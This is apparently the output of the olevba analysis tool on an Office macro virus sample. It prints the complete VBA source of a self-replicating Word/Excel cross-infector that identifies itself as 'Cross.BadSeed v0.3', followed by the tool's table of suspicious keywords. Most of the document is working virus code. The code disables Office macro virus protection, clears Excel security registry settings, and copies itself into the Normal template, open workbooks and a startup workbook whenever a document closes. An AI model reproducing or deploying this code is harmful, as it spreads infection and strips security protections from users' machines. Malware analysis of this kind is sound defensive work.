olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Hopper.k-668b7dd7773055d3a0b6708573aa9bf871176e58
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Hopper.k-668b7dd7773055d3a0b6708573aa9bf871176e58 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<!--1nternal-->
'Cross.BadSeed v0.3 /1nternal
Private InRoutine As Boolean
Private Sub Document_Close()
    On Error Resume Next
    Options.SaveNormalPrompt = False
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Set NT = NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule
    Set AD = ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule
    If NT.Lines(1, 1) <> "'<!--1nternal-->" Then
        NT.DeleteLines 1, NT.CountOfLines
        For i = 1 To 90
            NT.InsertLines i, AD.Lines(i, 1)
        Next
    Else
        Call WackExcel
    End If
    If AD.Lines(1, 1) <> "'<!--1nternal-->" Then
        AD.DeleteLines 1, AD.CountOfLines
        For i = 1 To 90
            AD.InsertLines i, NT.Lines(i, 1)
        Next
    End If
    If Day(Now) = 15 And (Int((15 * Rnd) + 1) = 1) Then
        MsgBox ("Cross.BadSeed v0.3 /1nternal")
    End If
End Sub
Private Sub Workbook_Deactivate()
    On Error Resume Next
    If UCase(Dir(Application.StartupPath + "\Book1.")) <> "BOOK1" And InRoutine <> True Then
        InRoutine = True
        Call WackWord
        Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
        InfectBook ("Book1.")
        Workbooks("Book1.").Close SaveChanges:=True
    End If
    For i = 1 To Workbooks.Count
        InfectBook (i)
    Next
    If Day(Now) = 1 And (Int((15 * Rnd) + 1) = 1) Then
        MsgBox ("Cross.BadSeed v0.3 /1nternal")
    End If
End Sub
Private Sub InfectBook(Booknum)
        If Workbooks(Booknum).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(1, 1) <> "'<!--1nternal-->" Then
            For y = 1 To 90
                Workbooks(Booknum).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.InsertLines y, ThisWorkbook.VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(y, 1)
            Next
        End If
End Sub
Private Sub WackWord()
    On Error Resume Next
    Set WordObj = GetObject(, "Word.Application")
    If WordObj = "" Then
        Set WordObj = CreateObject("Word.Application")
        Quit = True
    End If
    Set NT = WordObj.NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule
    If NT.Lines(1, 1) <> "'<!--1nternal-->" Then
        WordObj.Options.SaveNormalPrompt = False
        NT.DeleteLines 1, NT.CountOfLines
        NT.InsertLines 1, "Public Sub DisableAV()"
        NT.InsertLines 2, " System.PrivateProfileString(" + Chr(34) + Chr(34) + ", " + Chr(34) + "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel" + Chr(34) + ", " + Chr(34) + "Options6" + Chr(34) + ") = " + Chr(34) + Chr(34)
        NT.InsertLines 3, " System.PrivateProfileString(" + Chr(34) + Chr(34) + ", " + Chr(34) + "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel" + Chr(34) + ", " + Chr(34) + "Options6" + Chr(34) + ") = " + Chr(34) + Chr(34)
        NT.InsertLines 4, "End Sub"
        WordObj.Run "Normal.ThisDocument.DisableAV"
        NT.DeleteLines 1, NT.CountOfLines
        For i = 1 To 90
            NT.InsertLines i, ThisWorkbook.VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(i, 1)
        Next
    End If
    Set NT = Nothing
    If Quit = True Then WordObj.Quit
End Sub
Private Sub WackExcel()
    On Error Resume Next
    Set xlApp = CreateObject("Excel.Application")
    If UCase(Dir(xlApp.Application.StartupPath + "\Book1.")) <> UCase("BOOK1") Then
        On Error Resume Next
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
        System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = ""
        xlApp.Workbooks.Add.SaveAs xlApp.Application.StartupPath & "\Book1."
        For y = 1 To 90
            xlApp.Workbooks("Book1.").VBProject.VBComponents.Item("ThisWorkbook").CodeModule.InsertLines y, NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(y, 1)
        Next y
        xlApp.Workbooks("Book1.").Close SaveChanges:=True
    End If
    xlApp.Application.Quit
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

